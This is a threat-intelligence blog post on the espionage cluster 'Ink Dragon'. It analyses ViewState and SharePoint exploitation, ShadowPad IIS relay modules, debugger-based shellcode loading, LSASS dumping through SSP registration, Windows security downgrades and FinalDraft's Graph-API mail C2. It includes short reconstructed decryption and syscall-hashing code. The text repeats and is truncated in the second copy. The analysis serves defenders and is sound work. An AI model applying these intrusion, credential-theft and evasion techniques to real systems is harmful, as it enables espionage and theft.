This cluster is assessed by several vendors to be PRC-aligned. Since at least early 2023, Ink Dragon has repeatedly targeted government, telecom, and public-sector infrastructure, initially concentrating on Southeast Asia and South America, but with an increasing footprint in Europe and other regions. The actor’s campaigns combine solid software engineering, disciplined operational playbooks, and a willingness to reuse platform-native tools to blend into normal enterprise telemetry. This mix makes their intrusions both effective and stealthy.A notable characteristic of Ink Dragon’s operations is their tendency to convert compromised environments into part of a larger, distributed relay network. By deploying a ShadowPad IIS Listener Module across multiple victims, the group effectively turns each breached server into a communication node capable of receiving, forwarding, and proxying commands. This design allows attackers to route traffic not only deeper inside a single organization’s network, but also across different victim networks entirely. As a result, one compromise can quietly become another hop in a global, multi-layered infrastructure supporting ongoing campaigns elsewhere, blending operational control with strategic reuse of previously breached assets.This blog also presents the forensic story of a high‑stakes compromise of a European government office, highlighting recurring methods observed across different victims. We walk through the entire kill chain observed in the field, including web-centric initial access, hands-on-keyboard activity, staged loaders, privilege escalation, and credential-harvesting components, as well as aggressive lateral movement that culminated in domain dominance. We also document multiple delivery and persistence patterns that Ink Dragon favors, and unpack a new variant of the FinalDraft backdoor, which is used as a resilient, cloud-native command-and-control platform.Beyond the technical details, this article shows how Ink Dragon’s tooling and repeatable TTPs reflect a mature, modular development model that steadily expands in capability while maintaining a consistent operational philosophy.Attackers begin by gaining initial access through ViewState deserialization or ToolShell-based exploits, then deploy ShadowPad on the compromised server. They harvest IIS worker credentials and establish an RDP proxy to move laterally, using RDP and ShadowPad’s built-in capabilities along with reused credentials. After obtaining access to a domain admin account, they achieve domain dominance. From there, they deploy FinalDraft on strategic machines and install a ShadowPad IIS listener on public-facing servers, enabling new victims to connect to the attackers’ infrastructure as the campaign continues.In the environments we investigated, the common initial access vector is exploitation of ASP.NET ViewState deserialization via publicly disclosed machine keys. In this scenario, the  parameter, normally protected using the application’s machineKey, can be forged if the key is copied from public sources. Once the attacker can generate a valid signature, they can inject a crafted ViewState payload that the server deserializes, leading to remote code execution.In other cases, we’ve also observed the actor abusing the ToolShell SharePoint vulnerability. ToolShell is an exploit chain targeting on-premises Microsoft SharePoint that combines authentication bypass and unsafe deserialization (CVE-2025-49706 / CVE-2025-53771 and CVE-2025-49704 / CVE-2025-53770, among others) to enable unauthenticated remote code execution and web shell deployment on vulnerable servers. In July 2025, we observed the actor conducting mass scanning for the ToolShell vulnerability during the initial waves of exploitation, indicating the actor was among a limited set of actors with early access to the exploit.This demonstrates that the attackers have multiple web-facing options for initial compromise. The practical workflow is straightforward: enumerate internet-facing IIS/SharePoint servers, test for predictable machine keys or vulnerable SharePoint endpoints (often using publicly available fuzzing lists), and submit crafted POSTs or payloads that trigger deserialization/RCE. These attacks are stealthy and scale well against large organizations with inconsistent web configurations.Internal Operation & Kill Chain OverviewIn these campaigns, the adversary leverages two complementary strengths of a web compromise after gaining an initial foothold: privileged local artifacts (the IIS application/service credentials and configuration) and visibility into active administrative sessions.By obtaining the IIS / or otherwise recovering the site’s cryptographic secrets, the attacker can decrypt locally stored configuration blobs and credentials that the site or its worker processes store. In practice, this frequently yields the IIS worker/app-pool account password or other local secrets that carry elevated rights on the host and often across other IIS servers that reuse the same service account or credential material.With a local administrative credential in hand, Ink Dragon escalates from code execution in  to full system control, and then leverages that control to create a persistent remote access channel (commonly an RDP tunnel or scheduled task that launches an administrative payload). Because many organizations reuse service credentials across web farms for management convenience, obtaining a single IIS credential can allow the actor to authenticate to sibling IIS hosts and pivot laterally with minimal network noise. Ink Dragon frequently tunnels RDP traffic to reach internal hosts from a remote workstation, exposing their machine names and enabling direct, interactive sessions that appear superficially legitimate.From there, the attacker’s lateral playbook becomes straightforward: stage a resilient implant (ShadowPad/FinalDraft variants are common) and propagate it using native protocols such as SMB. The operator copies the triad (EXE + side-loaded DLL + encrypted blob) into writable shares, creating a service or scheduled task to run the payload, and attempting to disguise the service/process under a plausible name.The most common patterns we observed: – the actor created tasks with benign-looking names (notably ) set to run under  and pointing to staged loader hosts such as . Tasks were often created to run once at a chosen time, allowing the operator to bootstrap wide-scale re-execution while minimizing noisy periodic callbacks. – on several machines, Ink Dragon installed services to launch their loaders as persistent system services, with service names disguised as Windows updates or temporary maintenance (e.g., ). These services were used to run side-loaded triads (EXE + malicious DLL + encrypted blob), guaranteeing automatic restart and SYSTEM execution after reboots.It’s essential to note that many of the staged executables (e.g., ) were renamed to resemble native Windows binaries, yet they were digitally signed by legitimate vendors such as Advanced Micro Devices, Realtek Semiconductor Corp, and NVIDIA. Their  metadata differed from the on-disk names, indicating deliberate masquerading and abuse of trusted signatures to blend with the operating system.Ink Dragon combines targeted exploitation with heavy credential harvesting to quickly escalate local control into domain-level dominance.Local escalation via exploitation: In multiple incidents, the initial  RCE was followed by local escalation tooling such as  to obtain  from a web server context. This allowed full control over the host and the rights to create persistent services and change firewall settings.Credential harvesting and LSASS dumping: the operators deployed custom tools (we observed variants of ) to create LSASS dumps and extract registry hives (, ) into ProgramData or user-profile directories for offline cracking. Dump files and registry hive exports were then used to recover NTLM hashes and Kerberos material.Leveraging idle sessions: Ink Dragon actively enumerated Remote Desktop sessions and administrative consoles on key servers. In at least one instance, the actor located an idle RDP session belonging to a Domain Administrator that had authenticated via Network Level Authentication (CredSSP) using NTLMv2 fallback. Since the session remained disconnected but not logged off, it is highly likely that LSASS retained the associated logon token and NTLM verifier in memory. Ink Dragon obtained SYSTEM-level access to the host, extracted the token (and possibly the NTLM key material), and reused it to perform authenticated SMB operations. Through these actions, they were able to write to administrative shares and exfiltrate  and registry hives, marking the point at which they achieved domain-wide privilege escalation and control.Ink Dragon modified host firewall rules to permit broad outbound traffic and effectively turned compromised hosts into unconstrained exfiltration/proxy nodes.The group created a permissive outbound rule labeled to resemble legitimate software (we observed a rule named , associated with ) that allowed Any → Any outbound traffic across all profiles. The rule was created locally (not via GPO), enabled, and applied to the Defender process in  context. This bypasses upstream egress controls that would otherwise block custom ports or tunneling traffic.Building the Relay NetworkDuring the investigation, we discovered that Ink Dragon is actively converting compromised organizations into functional communication nodes within a distributed ShadowPad relay network. This capability is powered by an IIS Listener Module. Instead of serving as a traditional backdoor, the module enables the malware to register new URL listeners directly through the  API, which lets processes bind HTTP(S) endpoints dynamically, including wildcard patterns that match all sub-paths or hostnames. This means the malicious listener seamlessly coexists with legitimate IIS behavior, silently intercepting any incoming HTTP requests whose URL matches its configuration. When a request arrives, the module decrypts the payload and evaluates whether the structure fits its proprietary protocol. If not, it falls back to genuine IIS logic, serving real web content or returning legitimate error codes. The result is a hard-to-detect implant that blends into the server’s normal traffic patterns while retaining full control over its hidden C2 channel.Where this becomes significantly more strategic is in how the module manages remote peers. The listener can categorize external IP addresses into two functional roles: servers and clients It automatically pairs nodes from each list to relay traffic between them. Once two peers are matched, the compromised host becomes a live forwarding point: data arriving from the “server” side is streamed directly to the “client,” and responses are returned in the same manner, effectively turning the victim into a transparent communication bridge. We observed multiple instances where government entities were inadvertently serving as C2 relays. In some instances, the victim machine is leveraged as a hop, serving as an access node for ShadowPad clients active in other, unrelated target environments. This chaining effect forms a multi-layered mesh of compromised infrastructure, allowing the operator to issue commands to downstream implants without direct communication with them.Beyond its role in constructing a large-scale external relay network, the ShadowPad IIS module also exposes a conventional internal proxy capability, designed to route commands toward ShadowPad nodes located deeper within the same network. When the attackers need to deliver instructions to implants that do not have direct external reachability, the IIS module simply relays the traffic internally, behaving much like a pivot point inside the compromised environment. This capability is not new in concept, but its integration into a legitimate IIS worker process makes it extremely difficult to distinguish malicious lateral communication from normal internal service traffic.Beyond the relay logic itself, the module leaves behind an unusually rich forensic artifact: debug strings that document the number of bytes it forwards between external and internal IP addresses. These strings include source, destination, and payload size. During our investigation, this telemetry proved essential in reconstructing the attackers’ communication graph, enabling us to map exactly how commands entered the victim, how they were relayed, and which internal hosts were drawn into the chain. The presence of such granular logging underscores just how central the relay mechanism is to the operator’s workflow: the victim is not merely compromised, but actively repurposed as a communication bridge that keeps the broader ShadowPad infrastructure stitched together.This architecture enhances stealth and survivability. By routing commands through unrelated victims, the true controlling IP is never exposed, and network defenders have difficulty distinguishing malicious cross-organization traffic from legitimate inter-government or inter-infrastructure communication. Most significantly, every newly compromised perimeter system can be repurposed immediately as another hop, allowing Ink Dragon to expand its operational reach while obscuring both the origin and the direction of command flow.Tools & Post‑Exploitation ComponentsAs we expanded our analysis beyond the initial access vector, a broader toolset began to emerge. Ink Dragon does not operate with a single backdoor or a monolithic framework; instead, the intrusions feature a sequence of purpose-built components that activate at different stages of the operation. What follows is a breakdown of the post-exploitation tooling we recovered, from IIS-embedded ShadowPad modules to debugger-based loaders, credential-harvesting implants, and long-term command-and-control platforms.ShadowPad IIS Listener ModuleIntercepts selected IIS traffic, decrypts commands, builds a distributed relay network, and exposes a full ShadowPad backdoor on IIS servers.Triad structure (EXE + DLL + TMP) that decrypts and runs the ShadowPad core in memory while deleting artifacts.Memory-resident payload executionUses  scripts to patch memory, run shellcode, and load AES-encrypted payloads via a debugger session.Registers a malicious SSP DLL in LSASS, extracts a compressed LSASS memory dump via custom direct-syscall logic.Host-dependent payload loaderRC4-like decryption using the system’s InstallDate as entropy, delivering payloads via shared memory mapping.Long-term espionage & cloud C2Modular RAT using Microsoft Graph API; supports exfiltration, RDP history harvesting, tunneling, scheduling, and mailbox-based command exchange.ShadowPad IIS Listener ModuleThe ShadowPad IIS Listener Module deployed in this intrusion is a fully integrated component designed to masquerade as part of the legitimate IIS stack while quietly providing command-and-control and relay capabilities. Its configuration block defines several operational parameters that determine both how it responds to benign web traffic and how it handles attacker-controlled messages. These include a  string (used in HTTP response headers), a  path, and a fallback  path. Even when configuration fields are absent, the module falls back to realistic defaults — , "C:\\inetpub\\custerr\\en-US\\404.htm", and . Those values allow the module to blend seamlessly with a standard Windows Server installation.The most important part of the configuration is the list of URL patterns the module will intercept. These patterns are stored as wildcard-enabled strings, separated by semicolons, and are used to register listeners via the Windows  API. This API allows the module to attach itself to arbitrary HTTP URL prefixes, including those containing wildcards for hostnames or paths, making the listener hard to detect unless the exact bindings are enumerated at the OS level. Any inbound request matching one of these patterns is captured and passed through the module’s internal decryption and message-parsing routine.def decrypt_first_packet(buf: bytearray, seed: int, length: int):
    """
    buf     = bytearray starting at a1->type (first byte = LOBYTE(seed), second = HIBYTE(seed))
    length  = total length of buffer (rdx)
    """
    
    count = length - 2
    seed_lo = buf[0]
    seed_hi = buf[1]
    num = (seed_hi << 8) | seed_lo
    num &= 0xFFFFFFFF
    
    pos = 2
    for _ in range(count):
        hi = (num >> 16) & 0xFFFF
        num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
        buf[pos] ^= num & 0xFF
        pos += 1

    return bufRequests that do not conform to the attacker’s expected encrypted structure are quietly handled as normal IIS traffic: static files are served from the configured webroot folder when available, and legitimate error pages are returned otherwise. This fallback behavior ensures the listener remains operationally stealthy, presenting a legitimate façade while still acting as a covert interception point.Once a request passes the module’s URL‑matching, decryption, and structural checks, the ShadowPad IIS Listener evaluates the embedded command ID. These commands fall into two broad categories, both of which are handled by the same component.The first category contains the instructions responsible for building and maintaining the distributed relay network. These include commands that register an endpoint as a “server,” commands that register an endpoint as a “client,” and the logic that pairs nodes, forwards traffic, and maintains the two queues that drive the hop‑to‑hop communication model.The second category is entirely separate in purpose: a full backdoor command set enabling the operator to interact directly with the local system. These commands cover host reconnaissance, file operations, data collection, payload staging, configuration updates, process control, and network‑level actions. In other words, the same module responsible for linking compromised machines into a cross‑victim relay chain is also fully capable of operating as a traditional ShadowPad backdoor on that same host.Distributed Relay Network ConstructionThe most strategically significant capability lies in the module’s role in building and maintaining the operator’s distributed relay network. The IIS Listener maintains two concurrent registries of peers: a server list and a client list. Nodes can add themselves to either list via dedicated command IDs. Entries in the server list are periodically revalidated every 30 seconds, and the module issues acknowledgments to confirm ongoing availability. Nodes placed into the client list behave differently; if a client remains unpaired for 30 seconds, it is automatically pruned to prevent stale links.Whenever a new node is inserted into one of the lists and the Listener detects that both lists contain at least one live entry, it pairs the first server node with the first client node. At that moment, it sends the server the victim’s IP address. After this handshake, the module establishes bidirectional relaying between the two sockets, shuttling each packet from server → client and client → server with no further processing. The result is a fully transparent hop that allows an upstream operator to deliver commands to a downstream client without ever interacting with that client directly.The IIS Listener Module of ShadowPad also includes features of the ShadowPad client, letting the attackers run different commands on the IIS machine. This embedded command set provides the operator with extensive control over the compromised host, enabling everything from reconnaissance to interactive access to payload staging.The breadth of these command IDs illustrates how ShadowPad’s IIS Listener is more than a simple traffic forwarder; it is a self-contained control surface capable of both maintaining the distributed relay network and exerting fine-grained control over any machine running it. This duality is central to Ink Dragon’s operational philosophy: relay-capable nodes double as fully functional access points, allowing the operator to maintain stealthy persistence, collect intelligence, deploy additional tooling, and issue high-privilege instructions without ever exposing their true command infrastructure.ShadowPad’s backdoor exposes a broad command surface designed to give operators full, hands-on control of a compromised system. It begins with basic orchestration capabilities, retrieving the full command map, gathering a detailed system snapshot, launching an interactive reverse shell, or cleanly shutting down the implant when needed. From there, the malware offers an extensive file-management layer that can enumerate drives, walk directories, manipulate timestamps, create or remove files and folders, and read, write, move, or download data on demand. This is complemented by rich process and service control, allowing operators to list and kill processes, inspect loaded modules, and start, stop, or delete Windows services with the same precision seen in legitimate administration tools.ShadowPad also supports multiple execution models, including running commands with output capture, spawning interactive console processes with full screen-buffer access, and maintaining long-lived execution channels through pipes. The networking side is equally capable: the implant can inspect local TCP/UDP tables, alter network entries, and even serve as a pivot point by proxying or tunneling traffic through the infected host. In practice, these capabilities turn the backdoor into a complete remote operations platform that blends system administration, espionage tooling, and covert tunneling into a single, tightly integrated module. is a modular, multi-layered backdoor framework widely attributed to Chinese state-sponsored threat groups and frequently used in long-term espionage campaigns. ShadowPad allows operators to deploy customized modules for data exfiltration, credential harvesting, and lateral movement.In Ink Dragon’s operations, we observed numerous ShadowPad deployments following a recurring triad sideloading structure: an executable, a malicious DLL, and an encrypted TMP payload. The legitimate or masqueraded executable loads the malicious DLL, which in turn decrypts and executes the ShadowPad core from the TMP file directly in memory, erasing the payload afterward to minimize forensic artifacts.A notable detail in Ink Dragon’s ShadowPad loader is that many of the malicious DLLs across different incidents shared the same generic name, . The DLL loaders were MFC-based binaries, where the malicious code was heavily obfuscated using ScatterBrain.Once executed, these loaders perform on-the-fly decryption of configuration data and payloads stored in the same directory.C:\Program Files\Microsoft\EdgeC:\Program Files\Microsoft\Edge\ApplicationOne of Ink Dragon’s most distinctive TTPs is leveraging the Microsoft debugger () as an execution host.Rather than launching a typical EXE, the operator runs a WinDbg/CDB scripted session, such as: c:\users\public\cdb.exe -cf C:\Users\Public\config.ini -o C:\Users\Public\cdb.exe.The shipped  is not an innocuous INI file. It contains a sequence of memory-edit / write-bytes commands followed by a change to the instruction pointer (RIP) so execution continues at the attacker-controlled shellcode. The shellcode, in turn, reads an auxiliary file () from disk, decrypts it with an AES key hard-coded into the shellcode, and loads the real payload into memory for execution. After the payload runs, the debugger instance and helper files are often removed, leaving only transient memory-resident code. is Ink Dragon’s in-house LSASS extraction chain observed during multiple intrusions. The sequence starts with a small loader () that manipulates a companion DLL () in the same folder. The loader locates a placeholder (32 ‘d’ characters) inside , overwrites that placeholder with the path to an auxiliary file (), and produces a patched DLL named .Crucially, the loader calls  to register the DLL as a Security Support Provider SSP so that  will load it, a technique that forces LSASS itself to load attacker code in-process.The registered DLL reads , applies a simple XOR with  to recover a secondary payload, and then maps that payload into memory. The payload implements a custom -like routine (not using the Windows API directly) to create a compressed dump of , writing a ZIP-like dump file named .The chain uses direct syscalls (hashed at runtime) to evade API-based hooking and EDR detection.def hash_syscall(name: str) -> int:
    h = 0xCD7815D6                # constant seed
    for (*WORD) ch in name:       # iterate Unicode code-points
        h ^= (ord(ch) & 0xFFFF) + ror32(h, 8)
    return h & 0xFFFFFFFFThe DLL exposes a function called , which serves as the payload’s runtime entry point and orchestrates the loader’s core logic: when invoked,  creates a file in the system TEMP folder named using the victim process ID (for example ), captures a memory dump of  and writes that dump into the  file using a ZIP-style archive format. is a sideload-based loader that uses host-specific entropy to decrypt and execute payloads. After being sideloaded by a legitimate executable, the loader patches the host EXE’s code flow so that control transfers to its own logic immediately after load.The loader then queries the system’s  from the registry and derives a decryption key from that value. It uses the  as the seed for RC4 (or RC4-like) decryption of a third-file blob (the encrypted payload), often accessed via the  API to perform the decryption step. Once decrypted, the loader maps the payload via  /  and adjusts memory protections with , then transfers execution to the in-memory payload. is a well-engineered, full-featured remote administration tool with the ability to accept add-on modules that extend functionality and proxy network traffic internally, mostly by abusing Outlook mail service via the Microsoft Graph API. The samples and behavior we analyzed are consistent with previous public write-ups, but Ink Dragon’s deployments show continued feature expansion and careful operational tuning to reduce telemetry and maximize resilience.FinalDraft begins by locating and decrypting its configuration blob. The configuration is XORed with either a hash derived from the host  (making the config per-machine) or the hash of a hardcoded string.Once decrypted, the config exposes a unique GUID for the implant, the preferred communication transport, an AES key for message encryption, C2 endpoints and refresh tokens, and other operational metadata.00000000 struct __fixed config_structure
00000000 {
00000000     char refresh_token[5000];

000014BA };The most commonly used transport we observed is , which leverages the Microsoft Graph API (the token endpoint at https://login.microsoftonline.com/common/oauth2/token) to hide command-and-control traffic inside legitimate cloud mail flows. FinalDraft uses a refresh token embedded in its configuration to acquire OAuth access tokens, which it stores locally under HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UUID\ for later use. Commands and responses are exchanged as email drafts (messages whose subject starts with  and ). The payloads inside those messages are base64-encoded, AES-encrypted (with the config key), and compressed, which helps the operator hide instructions inside otherwise normal mailbox data and bypass network filtering that whitelists Microsoft cloud endpoints.FinalDraft implements a modular command framework in which operators push encoded command documents to the victim’s mailbox, and the implant pulls, decrypts, and executes them. Beyond the standard toolkit (process/service control, file/registry access, tunneling, and file transfer), the Ink Dragon variants we analyzed introduce several extensions that increase stealth, operational control, and data-theft efficiency.Flexible Beacon SchedulingThe malware supports highly granular callback controls, allowing operators to define daily beaconing windows or specify an explicit list of times when the implant will attempt to reach its C2. This schedule-based design helps blend command traffic into predictable operational patterns. extracts evidence of both outbound and inbound RDP usage.RDP OUT (Outbound RDP targets) – MRU-like entries in the user registry hives that record the servers the user has connected to (the built-in RDP client’s Recent Server list). For each entry, the tool reads  and the registry key’s last write time to produce lines like: <ServerName>:<UserNameHint>:<Timestamp>. This data is queried from HKCU\SOFTWARE\Microsoft\Terminal Server Client\Servers\<ServerName>\RDP IN (Inbound RDP sessions) – Event log entries from the Terminal Services Local Session Manager operational channel that record session connect/disconnect events. The tool queries Windows Event Log (via  / Get-WinEvent) for Event ID  (Remote Desktop Services: Session logon succeeded) and  (disconnect/other session events depending on Windows version). From these, it extracts records like: <UserName>:<IP>:<TimeStamp>.Security Control DowngradesSeveral commands intentionally weaken Windows security posture to assist persistence and lateral movement: – makes RDP connections authenticate with reusable credentials or delegated tokens, enabling credential hopping instead of “restricted” mode authentication. It makes RDP more attractive for lateral movement because an attacker who already controls an endpoint can initiate Restricted Admin connections using local credentials or stolen hashes to hop to other systems without needing cleartext passwords. – disables remote token filtering so local admin accounts receive full, not restricted, admin tokens over the network. This allows attackers to use reused or harvested local credentials to perform truly administrative remote actions without requiring domain credentials. – allows the powerful DSRM recovery account to log in even when the DC is not in Directory Services Restore Mode. It gives an attacker a powerful, low-audited way to gain full local control of a DC using an otherwise seldom-monitored credential or hash. – removes Process Protection Level safeguards, enabling injection and tampering with protected processes such as AV/EDR components. Adversaries do this to defeat endpoint defenses (allowing in-memory loaders, hooking, or live patching of AV and EDR components), to persist by replacing signed binaries, or to extract secrets from processes that would normally be protected.High-Throughput Exfiltration introduces a dedicated asynchronous worker for large-scale exfiltration. It streams data in sizeable chunks, reports progress in the background, and minimizes the number of required outbound connections. This is ideal for moving large archives over cloud-proxied channels without attracting attention.Host Profiling & InventoryInk Dragon consolidates multiple reconnaissance routines such as system fingerprinting, adapter enumeration, and installed software collection into a unified host profile. This captures IP configuration details (similar to ), network adapter metadata, installed applications (from HKLM and HKCU uninstall keys), system identifiers (MachineGuid, ProductId, InstallDate, and System uptime), and other indicators useful for victim classification and targeting.Ink Dragon’s targeting patterns show a consistent emphasis on government organizations, but beyond that shared characteristic, there are no clear indicators of how the actor selects its victims. Most affected organizations appear to serve a specific operational purpose for the actor rather than reflecting broad, industry-wide targeting.Geographically, Ink Dragon has focused heavily on government entities in Southeast Asia and Africa, and in recent months has expanded its activity into Europe. Since the ToolShell exploitation wave in July, the actor has steadily increased its operations in the region, with a growing concentration on European government-sector targets. A key aspect of Ink Dragon’s tradecraft is its use of compromised organizations as C2 relay nodes. As a result, we have observed European victims being leveraged to launch activity not only against additional European institutions, but also against targets in Africa and Southeast Asia. / During our investigation, we also observed evidence of a second intrusion set commonly tracked as RudePanda / REF3927 on several of the same victim environments compromised by Ink Dragon. While we do not assess these activity clusters to be operationally linked, the victimology overlap is notable: both actors exploited the  internet-facing server vulnerability to gain footholds in identical organizations and systems.Upon gaining access, RudePanda relied on its customary toolset, which included:Godzilla-derived webshells used to execute in-memory .NET payloads and deploy secondary components. belonging to the  family embed command-and-control logic directly inside the web server’s processing pipeline. Several modules contained PDB references to , consistent with tooling previously documented in public reporting. of IIS’s , where a simple diff against previous snapshots exposes the unauthorized module insertions.In addition, the actor deployed a kernel-mode rootkit driver,  (2965ddbcd11a08a3ca159af187ef754c), a modified and signed variant of . Its installation uses an INF file () naming the service “Wingtb.” The driver is derived from the open-source “Hidden” rootkit project, used to conceal files, processes, and registry entries after being activated on the system.Finally, several  artifacts referencing the operator’s backdoor kit that is consistent with the GoToHTTP tooling previously documented by both HarfangLab and Elastic were recovered on disk. Although the original payloads were deleted, these link files served as additional indicators of RudePanda’s presence.Ink Dragon’s operations illustrate a shift in how modern espionage clusters weaponize compromised infrastructure. Rather than treating each victim as an endpoint to be monitored or harvested, the group systematically folds every breached perimeter server into a distributed ShadowPad relay fabric. The IIS Listener Module sits at the center of this strategy: a stealthy, low-friction component that binds hidden URL prefixes, intercepts traffic without disrupting legitimate services, and quietly links victims together into a multi-hop communication grid.This architecture transforms the threat landscape in several ways. First, it grants the operators resilient command paths that do not rely on fixed infrastructure. Even if a downstream implant has no internet reachability or if upstream servers are blocked, the attacker can simply reroute through other victims. Second, it provides natural operational camouflage. Traffic tunneled between unrelated government or enterprise networks appears outwardly benign and often blends into the expected profile of inter-organizational HTTP flow. Third, it enables strategic re-use of compromised assets: once a host is enrolled as a ShadowPad relay, it becomes an evergreen pivot point that continues to serve campaigns long after the initial intrusion.The rest of the kill chain reinforces this design philosophy. Mature sideloading patterns, modular loader triads, memory-resident payloads, compartmentalized privilege escalation, and disciplined credential harvesting all serve one purpose: establish durable, high-privilege access long enough to turn the victim into reliable infrastructure. Whether deploying FinalDraft, staging ShadowPad loaders, or extracting domain-wide secrets, each action feeds back into the broader communication mesh that Ink Dragon relies on to maintain persistence across environments.Taken together, Ink Dragon presents a threat model in which the boundary between “compromised host” and “command infrastructure” no longer exists. Each foothold becomes a node in a larger, operator-controlled network – a living mesh that grows stronger with every additional victim. Defenders must therefore view intrusions not only as local breaches but as potential links in an external, attacker-managed ecosystem, where shutting down a single node is insufficient unless the entire relay chain is identified and dismantled. Ink Dragon’s relay-centric architecture is among the more mature uses of ShadowPad observed to date. A blueprint for long-term, multi-organizational access built on the victims themselves.2e84ea5cef8a9a8a60c7553b5878a349a037cffeab4c7f40da5d0873ede7ff72 - dongtai module

This cluster is assessed by several vendors to be PRC-aligned. Since at least early 2023, Ink Dragon has repeatedly targeted government, telecom, and public-sector infrastructure, initially concentrating on Southeast Asia and South America, but with an increasing footprint in Europe and other regions. The actor’s campaigns combine solid software engineering, disciplined operational playbooks, and a willingness to reuse platform-native tools to blend into normal enterprise telemetry. This mix makes their intrusions both effective and stealthy.

A notable characteristic of Ink Dragon’s operations is their tendency to convert compromised environments into part of a larger, distributed relay network. By deploying a ShadowPad IIS Listener Module across multiple victims, the group effectively turns each breached server into a communication node capable of receiving, forwarding, and proxying commands. This design allows attackers to route traffic not only deeper inside a single organization’s network, but also across different victim networks entirely. As a result, one compromise can quietly become another hop in a global, multi-layered infrastructure supporting ongoing campaigns elsewhere, blending operational control with strategic reuse of previously breached assets.

This blog also presents the forensic story of a high‑stakes compromise of a European government office, highlighting recurring methods observed across different victims. We walk through the entire kill chain observed in the field, including web-centric initial access, hands-on-keyboard activity, staged loaders, privilege escalation, and credential-harvesting components, as well as aggressive lateral movement that culminated in domain dominance. We also document multiple delivery and persistence patterns that Ink Dragon favors, and unpack a new variant of the FinalDraft backdoor, which is used as a resilient, cloud-native command-and-control platform.

Beyond the technical details, this article shows how Ink Dragon’s tooling and repeatable TTPs reflect a mature, modular development model that steadily expands in capability while maintaining a consistent operational philosophy.

Attackers begin by gaining initial access through ViewState deserialization or ToolShell-based exploits, then deploy ShadowPad on the compromised server. They harvest IIS worker credentials and establish an RDP proxy to move laterally, using RDP and ShadowPad’s built-in capabilities along with reused credentials. After obtaining access to a domain admin account, they achieve domain dominance. From there, they deploy FinalDraft on strategic machines and install a ShadowPad IIS listener on public-facing servers, enabling new victims to connect to the attackers’ infrastructure as the campaign continues.

In the environments we investigated, the common initial access vector is exploitation of ASP.NET ViewState deserialization via publicly disclosed machine keys. In this scenario, the `__VIEWSTATE` parameter, normally protected using the application’s machineKey, can be forged if the key is copied from public sources. Once the attacker can generate a valid signature, they can inject a crafted ViewState payload that the server deserializes, leading to remote code execution.

In other cases, we’ve also observed the actor abusing the ToolShell SharePoint vulnerability. ToolShell is an exploit chain targeting on-premises Microsoft SharePoint that combines authentication bypass and unsafe deserialization (CVE-2025-49706 / CVE-2025-53771 and CVE-2025-49704 / CVE-2025-53770, among others) to enable unauthenticated remote code execution and web shell deployment on vulnerable servers. In July 2025, we observed the actor conducting mass scanning for the ToolShell vulnerability during the initial waves of exploitation, indicating the actor was among a limited set of actors with early access to the exploit.

This demonstrates that the attackers have multiple web-facing options for initial compromise. The practical workflow is straightforward: enumerate internet-facing IIS/SharePoint servers, test for predictable machine keys or vulnerable SharePoint endpoints (often using publicly available fuzzing lists), and submit crafted POSTs or payloads that trigger deserialization/RCE. These attacks are stealthy and scale well against large organizations with inconsistent web configurations.

In these campaigns, the adversary leverages two complementary strengths of a web compromise after gaining an initial foothold: privileged local artifacts (the IIS application/service credentials and configuration) and visibility into active administrative sessions.

By obtaining the IIS `machineKey`/ `DecryptionKey` or otherwise recovering the site’s cryptographic secrets, the attacker can decrypt locally stored configuration blobs and credentials that the site or its worker processes store. In practice, this frequently yields the IIS worker/app-pool account password or other local secrets that carry elevated rights on the host and often across other IIS servers that reuse the same service account or credential material.

With a local administrative credential in hand, Ink Dragon escalates from code execution in `w3wp.exe` to full system control, and then leverages that control to create a persistent remote access channel (commonly an RDP tunnel or scheduled task that launches an administrative payload). Because many organizations reuse service credentials across web farms for management convenience, obtaining a single IIS credential can allow the actor to authenticate to sibling IIS hosts and pivot laterally with minimal network noise. Ink Dragon frequently tunnels RDP traffic to reach internal hosts from a remote workstation, exposing their machine names and enabling direct, interactive sessions that appear superficially legitimate.

From there, the attacker’s lateral playbook becomes straightforward: stage a resilient implant (ShadowPad/FinalDraft variants are common) and propagate it using native protocols such as SMB. The operator copies the triad (EXE + side-loaded DLL + encrypted blob) into writable shares, creating a service or scheduled task to run the payload, and attempting to disguise the service/process under a plausible name.

The most common patterns we observed:

 `SYSCHECK) set to run under` `SYSTEMand pointing to staged loader hosts such as` `conhost.exe. Tasks were often created to run once at a chosen time, allowing the operator to bootstrap wide-scale re-execution while minimizing noisy periodic callbacks.` `WindowsTempUpdate). These services were used to run side-loaded triads (EXE + malicious DLL + encrypted blob), guaranteeing automatic restart and SYSTEM execution after reboots.`

It’s essential to note that many of the staged executables (e.g., `conhost.exe`) were renamed to resemble native Windows binaries, yet they were digitally signed by legitimate vendors such as Advanced Micro Devices, Realtek Semiconductor Corp, and NVIDIA. Their `OriginalFileName` metadata differed from the on-disk names, indicating deliberate masquerading and abuse of trusted signatures to blend with the operating system.

Ink Dragon combines targeted exploitation with heavy credential harvesting to quickly escalate local control into domain-level dominance.

 `__VIEWSTATERCE was followed by local escalation tooling such as` `PrintNotifyPotatoto obtain` `SYSTEMfrom a web server context. This allowed full control over the host and the rights to create persistent services and change firewall settings.` `LalsDumper) to create LSASS dumps and extract registry hives (` `SAM,` `SYSTEM) into ProgramData or user-profile directories for offline cracking. Dump files and registry hive exports were then used to recover NTLM hashes and Kerberos material.` `NTDS.ditand registry hives, marking the point at which they achieved domain-wide privilege escalation and control.`

Ink Dragon modified host firewall rules to permit broad outbound traffic and effectively turned compromised hosts into unconstrained exfiltration/proxy nodes.

The group created a permissive outbound rule labeled to resemble legitimate software (we observed a rule named `Microsoft MsMpEng`, associated with `MsMpEng.exe`) that allowed Any → Any outbound traffic across all profiles. The rule was created locally (not via GPO), enabled, and applied to the Defender process in `SYSTEM` context. This bypasses upstream egress controls that would otherwise block custom ports or tunneling traffic.

During the investigation, we discovered that Ink Dragon is actively converting compromised organizations into functional communication nodes within a distributed ShadowPad relay network. This capability is powered by an IIS Listener Module. Instead of serving as a traditional backdoor, the module enables the malware to register new URL listeners directly through the `HttpAddUrl` API, which lets processes bind HTTP(S) endpoints dynamically, including wildcard patterns that match all sub-paths or hostnames. This means the malicious listener seamlessly coexists with legitimate IIS behavior, silently intercepting any incoming HTTP requests whose URL matches its configuration. When a request arrives, the module decrypts the payload and evaluates whether the structure fits its proprietary protocol. If not, it falls back to genuine IIS logic, serving real web content or returning legitimate error codes. The result is a hard-to-detect implant that blends into the server’s normal traffic patterns while retaining full control over its hidden C2 channel.

